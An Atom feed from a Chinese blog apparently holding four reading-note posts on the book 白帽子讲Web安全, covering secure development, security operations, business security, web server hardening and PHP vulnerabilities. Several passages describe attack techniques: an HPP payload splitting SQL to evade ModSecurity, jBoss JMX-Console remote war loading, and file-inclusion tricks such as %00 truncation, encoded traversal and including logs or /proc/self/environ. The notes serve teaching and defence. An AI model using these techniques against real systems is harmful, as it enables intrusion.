<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>WLFSKY</title>
  
  <subtitle>我们终其一生都在寻找</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://wlfsky.com/"/>
  <updated>2018-01-29T15:20:18.692Z</updated>
  <id>http://wlfsky.com/</id>
  
  <author>
    <name>wlfsky</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>精读《白帽子讲Web安全》十三</title>
    <link href="http://wlfsky.com/2018/01/29/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E5%8D%81%E4%B8%89/"/>
    <id>http://wlfsky.com/2018/01/29/精读《白帽子讲Web安全》十三/</id>
    <published>2018-01-29T12:32:20.000Z</published>
    <updated>2018-01-29T15:20:18.692Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="十七、安全开发流程（SDL）"><a href="#十七、安全开发流程（SDL）" class="headerlink" title="十七、安全开发流程（SDL）"></a>十七、安全开发流程（SDL）</h2><p>安全开发流程，能够帮助企业以最小的成本提高产品的安全性。它符合“Secure at the Source”的战略思想。实施好安全开发流程，对企业安全的发展来说，可以起到事半功倍的效果。</p><h3 id="SDL简介"><a href="#SDL简介" class="headerlink" title="SDL简介"></a>SDL简介</h3><p>SDL的全称是Security Development Lifecucle，即：安全开发生命周期。它是由微软最早提出的，在软件工程中实施，是帮助解决软件安全问题的办法。</p><p>SDL的过程大致分为16个阶段（优化后）：</p><ol><li>培训：核心安全培训</li><li>安全要求：确定安全的要求和需要做的事情。</li><li>质量门/bug栏：确定安全和隐私质量的最低可接受级别。</li><li>安全和隐私风险评估：安全风险评估（SRA）和隐私风险评估（PRA）是一个必需的过程。用于确定软件中需要深入评析的功能环节。</li><li>设计要求：在设计阶段应仔细考虑安全和隐私问题。</li><li>减小攻击面：通过减少攻击者利用潜在弱点或漏洞的机会来降低风险。包括关闭或限制对系统服务的访问，应用“最小权限原则”，以及尽可能地进行分层防御。</li><li>威胁建模：为项目或产品面临的威胁建立模型，明确可能来自的攻击有哪些方面。</li><li>使用指定的工具：在工具的使用上提前和安全团队进行沟通。</li><li>弃用不安全的函数：禁用不安全的函数或API，使用安全团队推荐的函数。</li><li>静态分析：代码静态分析可以由相关工具辅助完成，其结果与人工相结合。</li><li>动态程序分析：是静态的补充，用于测试环节验证程序的安全性。</li><li>模糊测试（Fuzzing Test）：是一种专门形式的动态分析，它通过故意向应用程序引入不良格式或随机数据诱发程序故障。</li><li>威胁模型和攻击面评析：项目经常因为需求变更等因素导致最终的产出偏离原本的设定，因此在项目后期重新对威胁模型和攻击面进行评析是有必要的，能够及时发现问题并修正。</li><li>事件响应计划：受SDL要求约束的每个软件在发布时都必须包含事件响应计划。</li><li>最终安全评析：在发布之前仔细检查对软件执行的所有安全活动。</li><li>发布/存档：在产品发布的同事仍需对各类问题和文档进行存档，为紧急响应和产品升级提供帮助。</li></ol><p>相对于微软的SDL，OWASP退出了SAMM（Software Assurance Maturity Model），帮助开发者在软件工程的过程中实施安全。</p><p>SDL和SAMM的主要区别在于：SDL适用于软件开发商，他们以贩售软件为主要业务；而SAMM更适用于自主开发软件的使用者，如银行或在线服务提供商。</p><h3 id="敏捷SDL"><a href="#敏捷SDL" class="headerlink" title="敏捷SDL"></a>敏捷SDL</h3><h3 id="SDL实战经验"><a href="#SDL实战经验" class="headerlink" title="SDL实战经验"></a>SDL实战经验</h3><p>准则一：与项目经理进行充分沟通，排出足够的时间。</p><p>准则二：规范公司的立项流程，确保所有项目都能通知到安全团队，避免遗漏。</p><p>准则三：树立安全部门的权威，项目必须由安全部门审核完成后才能发布。</p><p>准则四：将技术方案写入开发、测试的工作手册中。</p><p>准则五：给工程师培训安全方案。</p><p>准则六：记录所有的安全bug，激励程序员编写安全的代码。</p><h3 id="需求分析与设计阶段"><a href="#需求分析与设计阶段" class="headerlink" title="需求分析与设计阶段"></a>需求分析与设计阶段</h3><p>需求分析阶段与设计阶段是项目的初始阶段。需求分析阶段将论证项目的目标、可行性、实现方向等问题。在需求阶段，安全工程师需要关心产品主要功能上的安全强度和安全体验是否足够，主要需要思考安全功能。“安全功能”是指产品本身提供给用户的安全功能，比如数字证书、密码取回问题等功能。而“安全的功能”，则指在产品具体功能的实现上要做到安全，不要出现漏洞而被黑客利用。</p><p>在需求分析阶段，可以对项目经理、产品经理或架构师进行访谈，以了解产品背景和技术架构，并给出相应的建议。</p><h3 id="开发阶段"><a href="#开发阶段" class="headerlink" title="开发阶段"></a>开发阶段</h3><p><strong>提供安全的函数</strong></p><p>讲安全方案写入开发规范中，就真正地让安全方案落了地。</p><p><strong>代码安全审计工具</strong></p><p>并非直接检查代码是否安全，而是检查开发者是否遵守了开发规范。</p><h3 id="测试阶段"><a href="#测试阶段" class="headerlink" title="测试阶段"></a>测试阶段</h3><p>在此阶段需要对产品进行充分的安全测试，验证需求分析、设计阶段的安全功能是否符合预期目标，并验证在开发阶段发现的所有安全问题是否得到解决。</p><p>安全测试一般应该独立于代码审计而存在。“安全测试”相对于“代码审计”而言，至少有两个好处：一是有一些代码逻辑较为复杂，通过代码审计难以发现所有问题，而通过安全测试可以将问题看的更清楚；二是有一些逻辑漏洞通过安全测试，可以更快地得到结果。</p><p>安全测试，一般分为自动化测试和手动测试两种方法。自动化测试以覆盖性的测试为目的，可以通过“Web安全扫描器”对项目或产品进行漏洞扫描。</p><p>目前Web安全扫描器针对“XSS”、“SQL Injection”、“Open Redirect”、“PHP File Include”等漏洞检测技术已经比较成熟。这是因为这些漏洞的检测方法主要是检测返回结果的字符串特征。而对于“CSRF”、“越权访问”、“文件上传”等漏洞，却难以达到自动化检测的效果。这是因为这些漏洞涉及系统逻辑或业务逻辑，有时候还需要人机交互参与页面流程。因此这类漏洞的检测更多的需要依靠手动测试完成。</p><p>优秀的Web安全扫描器，商业软件的代表有“IBM Rational Appscan”、 “WebInspect”、“Acunetix WVS”等；在免费的扫描器中，也不乏精品，比如 “w3af”、“skipfish”等。</p><h2 id="十八、安全运营"><a href="#十八、安全运营" class="headerlink" title="十八、安全运营"></a>十八、安全运营</h2><p>俗话说，安全是“三分技术，七分管理”。安全对于企业来说，结果才是最重要的。</p><h3 id="把安全运营起来"><a href="#把安全运营起来" class="headerlink" title="把安全运营起来"></a>把安全运营起来</h3><p>从战略层面上来说，Aberdeen Group提到了三句话：Find and Fix，Defend and Defer，Secure at the Source。</p><p>一个安全评估的过程，就是一个“Find and Fix”的过程。而像入侵检测系统、Web应用防火墙、反DDOS设备等则是一些防御性的工作,这些防御性的工作,是一个”Defend and Defer”的过程。最后“Secure at the Source”指的则是“安全开发流程（SDL）”，它能从源头降低安全风险，提高产品的安全质量。</p><h3 id="漏洞修补流程"><a href="#漏洞修补流程" class="headerlink" title="漏洞修补流程"></a>漏洞修补流程</h3><p>建立漏洞修补流程，是在“Fix”阶段要做的第一件事情。</p><p>（A）建立类似bugtracker的漏洞跟踪机制，并为漏洞的紧急程度选择优先级；</p><p>（B）建立漏洞分析机制，并与程序员一起制定修补方案，同时review补丁的代码实现；</p><p>（C）对曾经出现的漏洞进行归档，并定期统计漏洞修补情况。</p><h3 id="安全监控"><a href="#安全监控" class="headerlink" title="安全监控"></a>安全监控</h3><p>安全监控与报警，是“Defend and Defer”的一种有效手段。</p><h3 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h3><p>常见的安全监控产品有IDS（入侵检测系统）、IPS（入侵防御系统）、DDOS监控设备等。在IDS这个大家庭中，Web应用防火墙（简称WAF）又是近年来兴起的一种产品。相对于传统的IDS来说，WAF专注于应用层攻击的检测和防御。</p><p>IDS、WAF等设备一般的布署方式是串联或并联在网络出口处，对网站的所有流量进行监控。在开源的软件中，也有一些优秀的IDS，比如ModSecurity就是一个非常成熟的WAF。还有一个同样著名的开源WAF是PHPIDS。</p><h3 id="紧急响应流程"><a href="#紧急响应流程" class="headerlink" title="紧急响应流程"></a>紧急响应流程</h3><p>安全监控的目的是为了在最快的时间内做出反应，因此报警机制必不可少。</p><p>入侵检测系统或其他安全监控产品的规则被触发时，根据攻击的严重程度，最终会产生“事件（Event）”或“报警（Alert）”，报警是一种主动通知管理员的提醒方式。</p><p>常见的报警方式有三种：</p><ol><li>邮件报警：这是成本最低的报警方式，建立一个SMTP服务器就可以发送报警邮件。报警内容可以描写得丰富详实。</li><li>IM报警：通过调用一些IM的API，可以实现IM报警。IM报警相对邮件报警来说实时性要好一些，但IM报警的内容长度有限，难以向邮件报警的内容一样丰富。</li><li>短信报警：短信报警需要架设短信网关，或者采用互联网上提供的一些短信发送服务。短信报警的实时性最好，无论管理员在何时何地都能收到报警，但短信报警的局限之处是单条短信能容纳的内容较少，因此短信报警内容一般都短小精悍。</li></ol><p>建立紧急响应流程，首先要建立“紧急响应小组”，这个小组全权负责对紧急安全事件的处理、资源协调工作。小组成员需要包括：</p><ul><li>技术负责人</li><li>产品负责人</li><li>最了解技术架构的资深开发工程师</li><li>资深网络工程师</li><li>资深系统运维工程师</li><li>资深DBA</li><li>资深安全专家</li><li>监控工程师</li><li>公司公关</li></ul><p>这个小组的主要工作是在第一时间弄清楚问题产生的原因，并协调相关的资源进行处理。因此小组的成员可能随时扩大。</p><p>当安全事件发生时，首先应该通知到安全专家，并由安全专家召集紧急响应小组，处理相关问题。在处理安全问题时，有两个需要注意的地方。<strong>一是需要保护安全事件的现场。二是以最快的速度处理完问题。</strong></p><p>经过这一段时间专心精读《白帽子讲Web安全》这本书后，感觉自己在安全这条路上买进了一大步，之前一些模糊不清的知识点都已经弄清楚了，在读这本书的过程中，不止一遍的感叹吴瀚清老师的过人之处，也非常感谢吴瀚清老师呕心沥血编写的这本书。</p><p>安全这条路很难，但我从来不曾止步！Fighting！</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="安全开发流程SDL" scheme="http://wlfsky.com/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8BSDL/"/>
    
      <category term="安全运营" scheme="http://wlfsky.com/tags/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》十二</title>
    <link href="http://wlfsky.com/2018/01/29/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E5%8D%81%E4%BA%8C/"/>
    <id>http://wlfsky.com/2018/01/29/精读《白帽子讲Web安全》十二/</id>
    <published>2018-01-29T09:52:07.000Z</published>
    <updated>2018-01-29T12:27:03.339Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="十六、互联网业务安全"><a href="#十六、互联网业务安全" class="headerlink" title="十六、互联网业务安全"></a>十六、互联网业务安全</h2><h3 id="产品安全"><a href="#产品安全" class="headerlink" title="产品安全"></a>产品安全</h3><p><strong>安全是产品的一个特性。</strong></p><p>安全本身可视作产品的一个组成部分。</p><p>安全是产品特性的一个组成部分，具备了安全性，产品才是完整的；安全做好了，产品最终才能真正成熟。</p><p>一个优秀的安全方案，除了可以有效地解决问题以外，至少还必须具备两个条件：</p><ol><li>良好的用户体验；</li><li>优秀的性能。</li></ol><p>提高密码复杂度的需求可分为两点：</p><ol><li>如何对抗暴力破解；</li><li>如何防止密码中包含个人信息。</li></ol><p>如果我们的产品能够潜移默化地培养用户的安全习惯，将用户往更安全的行为上引导，那么这样的安全就是最理想的产品安全。</p><h3 id="业务逻辑安全"><a href="#业务逻辑安全" class="headerlink" title="业务逻辑安全"></a>业务逻辑安全</h3><p><strong>登录问题</strong></p><p><strong>密码取回流程</strong></p><p><strong>账户被盗的途径</strong></p><ul><li>网站登录过程中无HTTPS，密码在网络中被嗅探。</li><li>用户电脑中了木马，密码被键盘记录软件所获取。</li><li>用户被钓鱼网站所迷惑，密码被钓鱼网站所骗取。</li><li>网站某登录入口可以被暴力破解。</li><li>网站密码取回流程存在逻辑漏洞。</li><li>网站存在XSS等客户端脚本漏洞，用户账户被间接窃取。</li><li>网站存在SQL注入等服务器端漏洞，网站被黑客入侵导致用户账户信息泄露。</li></ul><p><strong>分析账户被盗的原因</strong></p><ul><li>首先，客服是最重要和直接的渠道。</li></ul><ul><li>其次，从日志中寻找证据。</li></ul><ul><li>最后，打入敌人内部，探听最新动态。</li></ul><h3 id="互联网的垃圾"><a href="#互联网的垃圾" class="headerlink" title="互联网的垃圾"></a>互联网的垃圾</h3><p><strong>垃圾的危害</strong></p><p>垃圾注册几乎成为一切业务安全问题的源头。</p><p><strong>垃圾处理</strong></p><p>处理垃圾离不开两个步骤：“识别”和“拦截”。如果仔细分析垃圾行为特征，可以大致分成：内容的特征、行为的特征、客户端本身的特征。从这三个方面入手，可以得出不同类型的规则。</p><ul><li>基于内容的规则：以自然语言分析、关键词匹配等为代表。</li><li>基于行为的规则：以业务逻辑规则为代表。</li><li>基于客户端识别的规则：以人机识别为代表的，比如验证码，或者让客户端去解析 JavaScript。</li></ul><h3 id="关于网络钓鱼"><a href="#关于网络钓鱼" class="headerlink" title="关于网络钓鱼"></a>关于网络钓鱼</h3><p>控制钓鱼网站传播的途径，就能对钓鱼网站实施有效打击。</p><p><strong>邮件钓鱼</strong></p><p>SPF（Sender Policy Framework）是对抗“邮件地址伪造”的一项主要技术。在没有更好的技术出现时，只能选择去推广SPF。</p><p><strong>直接打击钓鱼网站</strong></p><p>在钓鱼网站的防控中，还有一个有力的措施，就是<strong>关停站点</strong>。</p><p><strong>用户教育</strong></p><p><strong>自动化识别钓鱼网站</strong></p><p><strong>网购流程钓鱼</strong></p><ol><li>登录，可以得到用户的账号密码</li><li>进入确认购买页面</li><li>进入付款页面，可以得到用户的支付密码</li><li>支付失败，跳转到支付页面，内嵌表单</li><li>最终被骗付款</li></ol><p><strong>分析与防范网购流程钓鱼</strong></p><p>一个正常的网购流程，一般如下：</p><p>商户（比如淘宝网）——&gt; 第三方支付平台（比如支付宝）——&gt;网上银行（比如工商银行）</p><p>这实际上是一个跨平台传递信息的过程。</p><p>贯穿不同平台的唯一标识，是订单号。订单中只包含了商品信息，但缺少创建订单用户的相关信息。这是网上支付流程中存在的一个重大设计缺陷。造成这一缺陷的原因是，在网购过程中的每一个平台都有一套自己的账户体系，而账户体系之间并没有对应关系。因此平台与平台之间，只能根据订单本身的信息作为唯一的判断依据。</p><p>在交易过程中，银行只知道这个订单是否已经被支付完成，而不知道是谁支付了订单。</p><p>解决这个设计缺陷的方法是：找到应唯一的客户端信息，贯穿于整个网上支付流程的所有平台，保证订单是由订单创建者本人支付的。目前来看，使用客户端IP地址作为这个信息，比较经济，易于推广。</p><h3 id="用户隐私保护"><a href="#用户隐私保护" class="headerlink" title="用户隐私保护"></a>用户隐私保护</h3><p>如果网站为了提供更好的服务而收集用户的个人数据，则应该做到以下几点：</p><ul><li><strong>首先，用户应该拥有知情权和选择权。</strong>网站有义务告知用户获取了什么数据，并公布自己的隐私策略或条款。用户也有权利对不喜欢的隐私策略说不。</li><li><strong>其次，网站应该妥善保管收集到的用户数据，不得将数据用于任何指定范围以外的用途。</strong></li></ul><p><strong>Do-Not-Track</strong></p><p>拒绝网上追踪用户的行为。Do-Not-Track工作在浏览器上。该选项打开后，将在HTTP头中增加一个header，用以告诉网站用户不想被追踪。</p><p>隐私保护是一个博弈的过程。网名们处于弱势群体，需要学会保护自己的利益。</p><p><strong>互联网公司要想健康地发展，离不开业务安全。把握住业务安全，对于公司的安全部门来说，就是真正把握住了部门发展的命脉，这是真正看得见、摸得着的敌人。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="互联网业务安全" scheme="http://wlfsky.com/tags/%E4%BA%92%E8%81%94%E7%BD%91%E4%B8%9A%E5%8A%A1%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》十一</title>
    <link href="http://wlfsky.com/2018/01/29/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E5%8D%81%E4%B8%80/"/>
    <id>http://wlfsky.com/2018/01/29/精读《白帽子讲Web安全》十一/</id>
    <published>2018-01-29T07:59:18.000Z</published>
    <updated>2018-01-29T09:51:17.829Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="十五、Web-Server配置安全"><a href="#十五、Web-Server配置安全" class="headerlink" title="十五、Web Server配置安全"></a>十五、Web Server配置安全</h2><p>Web服务器是Web应用的载体。Web服务器安全，考虑的是应用布署时的运行环境安全。这个运行环境包括Web Server、脚本语言解释器、中间件等软件。</p><h3 id="Apache安全"><a href="#Apache安全" class="headerlink" title="Apache安全"></a>Apache安全</h3><p>Web Server的安全我们关注两点：一是Web Server本身是否安全；二是Web Server是否提供了可使用的安全功能。</p><p>检查Apache安全的第一件事情，就是检查Apache的Module安装情况，根据“最小权限原则”，应该尽可能地煎炒不必要的Module，对于要使用的Module，则检查其对应版本是否存在已知的安全漏洞。指定Apache进程以单独的用户身份运行，这通常需要为Apache单独建立一个user/group。<strong>Apache以root身份或者admin身份运行是一个非常糟糕的决定。</strong></p><p>使用高权限身份运行Apache的结果可能是灾难性的，它会带来两个可怕的后果：</p><ol><li><p>当黑客入侵Web成功后，将直接获得一个高权限的shell；</p></li><li><p>应用程序本身将具备较高权限，当出现bug时，可能会带来较高风险，比如删除本地文件、杀死进程等不可预料的结果。</p></li></ol><p>比较好的做法是使用专门的用户身份运行Apache，这个用户身份不应该具备shell，它唯一的作用就是用来运行Web应用。</p><p>要保护好Apache log。一般来说，攻击者入侵成功后，要做的第一件事情就是清除入侵痕迹，修改、删除日志文件，因此access log应当妥善保管，比如实时地发送到远程的syslog服务器上。</p><h3 id="Nginx安全"><a href="#Nginx安全" class="headerlink" title="Nginx安全"></a>Nginx安全</h3><p>多多关注Nginx的漏洞信息，并及时将软件升级到安全的版本。就软件安全本身来看，Nginx与Apache最大的区别在于，检查Apache安全时更多的要关注Module的安全，而Nginx则需要注意软件本身的安全，及时升级软件版本。</p><h3 id="jBoss远程命令执行"><a href="#jBoss远程命令执行" class="headerlink" title="jBoss远程命令执行"></a>jBoss远程命令执行</h3><p>jBoss是J2EE环境中的一个流行的Web容器。由于jBoss在默认安装时会有一个管理后台，叫做JMX-Console，它提供给管理员一些强大的功能，其中包括配置MBeans，这同样也会为黑客们打开方便之门。通过8080端口（默认安装时会监听8080端口）访问/jmx-console能够进入到这个管理界面。默认安装时访问JMX-Console是没有任何认证的。在JMX-Console中，有多种可以远程执行命令的方法。最简单的方式，是通过DeploymentScanner远程加载一个war包。默认的DeploymentScanner将检查URL是否是file:/[JBOSSHOME]/server/default/deploy/，但通过addURL()方法却可以添加一个远程的war包。</p><h3 id="Tomcat远程命令执行"><a href="#Tomcat远程命令执行" class="headerlink" title="Tomcat远程命令执行"></a>Tomcat远程命令执行</h3><p>Apache Tomcat与jBoss一样，默认也会运行在8080端口。它提供的Tomcat Manager的作用与JMX-Console类似，管理员也可以在Tomcat Manager中布署war包。Tomcat Manager布署war包需要有manager权限，而这一权限是在配置文件中定义的。</p><p>虽然Tomcat后台有密码认证，但仍然建议删除这一后台，因为攻击者可以通过暴力破解等方式获取后台的访问权限，从安全的角度看，这增加了系统的攻击面，得不偿失。</p><h3 id="HTTP-Parameter-Pollution"><a href="#HTTP-Parameter-Pollution" class="headerlink" title="HTTP Parameter Pollution"></a>HTTP Parameter Pollution</h3><p>被称为HPP攻击。简单来说，就是通过GET或POST向服务器发起请求时，提交两个相同的参数，那么服务器选择可能会不同。这种特性在绕过一些服务器端的逻辑判断时，会非常有用。这种HPP攻击，与Web服务器环境、服务器端使用的脚本语言有关。HPP本身可以看做服务器端软件的一种功能，参数选择的顺序是由服务器端软件所决定的。</p><p>可以通过HPP混淆参数，从而绕过ModSecurity对于SQL注入的检测。</p><p><code>/index.aspx?page=select 1,2,3 from table where id=1</code>    NO </p><p><code>/index.aspx?page=select 1&amp;oage=2,3 from table where id=1</code>   YES</p><p>从防范上来看，由于HPP是服务器软件的一种功能，所以只需在具体的环境中注意服务器环境的参数取值顺序即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;作者：wlfsky
格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://wlfsky.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="web安全" scheme="http://wlfsky.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Web Server配置安全" scheme="http://wlfsky.com/tags/Web-Server%E9%85%8D%E7%BD%AE%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>精读《白帽子讲Web安全》十</title>
    <link href="http://wlfsky.com/2018/01/29/%E7%B2%BE%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2Web%E5%AE%89%E5%85%A8%E3%80%8B%E5%8D%81/"/>
    <id>http://wlfsky.com/2018/01/29/精读《白帽子讲Web安全》十/</id>
    <published>2018-01-29T03:05:00.000Z</published>
    <updated>2018-01-29T07:58:49.407Z</updated>
    
    <content type="html"><![CDATA[<pre><code>作者：wlfsky格言：每一个不曾起舞的日子 都是对生命的辜负    ---尼采</code></pre><a id="more"></a><hr><h2 id="十四、PHP安全"><a href="#十四、PHP安全" class="headerlink" title="十四、PHP安全"></a>十四、PHP安全</h2><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>严格来说，文件包含漏洞是“代码注入”的一种。“代码注入”的典型代表就是文件包含（File Inclusion）。文件包含可能会出现在 JSP、PHP、ASP等语言中，常见的导致文件包含的函数如下：</p><ul><li>PHP：include(), include_once(), require(), require_once(), fopen(), readfile(), …</li><li>JSP/Servlet：ava.io.File(), java.io.FileReader(), …</li><li>ASP：include file, include virtual, …</li></ul><p>文件包含是PHP的一种常见用法，主要由四个函数完成：include()、require()、include_once()、require_once()。当使用这4个函数包含一个新的文件时，<strong>该文件将作为PHP代码执行，PHP内核并不会在意该被包含的文件是什么类型。</strong>所以如果被包含的是txt文件、图片文件、远程URL，也都将作为PHP代码执行。这一特性，在攻击中将非常有用。</p><p>要想成功利用文件包含漏洞，需要满足下面两个条件：</p><ol><li>include()等函数通过动态变量的方式引入需要包含的文件；</li><li>用户能够控制该动态变量。</li></ol><p><strong>本地文件包含</strong></p><p>能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞（Local File Inclusion，简称LFI）。字符串截断的技巧%00，也是文件包含中最常用的技巧。若将0字节禁用，则可以利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。目录字符串，在Windows下256字节、Linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。通过<code>./././././abc</code>或者<code>/////////abc</code>或者<code>../1/abc/../1/abc/../1/abc/</code>。除了include()等四个函数外，PHP中能够对文件进行操作的函数都有可能出现漏洞。虽然大多数情况下不能执行PHP代码，但能够读取敏感文件带来的后果也是比较严重的。如：fopen()、fread()……</p><p>利用<code>../../../</code>这样的方式来返回到上层目录中，这种方法又被称为“目录遍历（Path Traversal）”。常见的目录遍历漏洞，还可以通过不同放入编码方式来绕过一些服务器端漏洞。</p><ul><li>%2e%2e%2f等同于../</li><li>%2e%2e/等同于../</li></ul><p>目录遍历漏洞是一种跨越目录读取文件的方法，但当PHP配置了open_basedir时，将很好地保护服务器，使得这种攻击无效。open_basedir的作用是限制在某个特定目录下PHP能打开的文件，其作用与safe_mode是否开启无关。</p><p>要解决文件包含漏洞，应该尽量避免包含动态的变量，尤其是用户可以控制的变量。使用枚举是个不错的办法。</p><p><strong>远程文件包含</strong></p><p>如果PHP的配置选项allow_url_include为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞（Remote File Inclusion，简称RFI）。问号后面的代码被解释成URL的querystring，也是一种“截断”，这是在利用远程文件包含漏洞时的常见技巧。同样的，%00也可以用做截断符号。</p><p>远程文件包含漏洞可以直接用来执行任意命令。</p><p><strong>本地文件包含的利用技巧</strong></p><p>本地文件包含漏洞，其实也是有机会执行PHP代码的，这取决于一些条件。远程文件包含漏洞之所以能够执行命令，就是因为攻击者能够上传自定义被包含的文件内容。因此本地文件包含漏洞想要执行命令，也需要找到一个攻击者能够控制内容的本地文件。</p><p>以下几种常见的技巧，用于本地文件包含后执行PHP代码：</p><ol><li>包含用户上传的文件。</li><li>包含data://或php://input等伪协议。</li><li>包含Session文件。</li><li>包含日志文件，比如Web Server的access log。</li><li>包含/proc/self/environ文件。</li><li>包含上传的临时文件（RFC1867）。</li><li>包含其它应用创建的文件，比如数据库文件、缓存文件、应用日志等，需要具体情况具体分析。</li></ol><p>包含用户上传文件很好理解，这也是最简单的一种方法。用户上传的文件内容如果包含了PHP代码，那么这些代码被include()加载后将会执行。但包含用户上传文件能否攻击成功，取决于文件上传功能的设计，比如要求知道用户上传后文件所在的物理路径等。</p><p>伪协议如php://input等需要服务器支持，同时要求allow_url_include设置为ON。在PHP 5.2.0之后的版本中支持data:伪协议，可以很方便地执行代码，它同样要求allow_url_include为ON。</p><p>包含Session文件的条件也较为苛刻，它需要攻击者能控制部分Session文件的内容。PHP默认生成的Session文件往往存放在/tmp目录下。</p><p>包含日志文件是一种比较通用的技巧。因为服务器一般都会往Web Server的access_log里记录客户端的请求信息，在error_log里记录出错请求。因此攻击者可以间接地将PHP代码写入到日志文件中，在文件包含时，只需要包含日志文件即可。</p><p>包含/proc/self/environ是一种更为通用的方法，因为它根本不需要猜测被包含文件的路径，同时用户也能控制它的内容。</p><p>以上这些方法，都要求PHP能够包含这些文件，而这些文件往往都处于Web目录之外，如果PHP配置了open_basedir，则很可能会使得攻击失效。</p><p>但PHP创建的上传临时文件，往往处于PHP允许访问的目录范围内。包含这个临时文件的方法，其理论意义大于实际意义。PHP会为上传文件创建临时文件，其目录在php.ini的upload_tmp_dir中定义。但该值默认为空，此时在Linux下会使用/tmp目录，在windows下会使用C:\windows\temp目录该临时文件的文件名是随机的，攻击者必须准确的猜测出该文件名才能成功利用漏洞。PHP在此处并没有使用安全的随机函数，因此使得暴力猜解成为可能。在Windows下，仅有65535种不同的文件名。</p><h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p><strong>全局变量覆盖</strong></p><p>变量如果未被初始化，且能被用户所控制，那么很可能会导致安全问题。而在PHP中，这种情况在register_globals为ON时尤其严重。</p><p><strong>extract()变量覆盖</strong></p><p>extract()函数能将变量从数组导入当前的符号表，其函数定义如下：</p><p><code>int extract (array $var_array [, int $extract_type [, string $prefix]])</code></p><p>其中，第二个参数指定函数将变量导入符号表的行为，最常见的两个值是“EXTR_OVERWRITE”和“EXTR_SKIP”。</p><p>当值为“EXTR_OVERWRITE”时，再将变量导入符号表的过程中，如果变量名发生冲突，则覆盖已有变量；值为“EXTR_SKIP”则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用“EXTR_OVERWRITE”。</p><p><strong>遍历初始化变量</strong></p><p>常见的一些以遍历的方式释放变量的代码，可能会导致变量覆盖。</p><p><strong>import_request_variables变量覆盖</strong></p><p><strong>parse_str()变量覆盖</strong></p><p>parse_str()函数往往被用于解析URL的query string，但是当参数值能被用户控制时，很可能导致变量覆盖。</p><p><strong>安全建议</strong></p><ul><li>首先，确保register_globals=OFF。若不能自定义php.ini，则应该在代码中控制。</li><li>其次，熟悉可能造成变量覆盖的函数和方法，检查用户是否能够控制变量的来源。</li><li>最后，养成初始化变量的好习惯。</li></ul><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p><strong>“危险函数”执行代码</strong></p><p>危险函数popen()、system()、passthru()、exec()等都可以直接执行系统命令。此外，eval()函数也可以执行PHP代码。<strong>挖掘漏洞的过程，通常需要先找到危险函数，然后回溯函数的调用过程，最终看在整个调用的过程中用户是否有可能控制输入。</strong></p><ul><li>phpMyAdmin 3.4.3.1 远程代码执行漏洞</li><li>MyBB 1.4 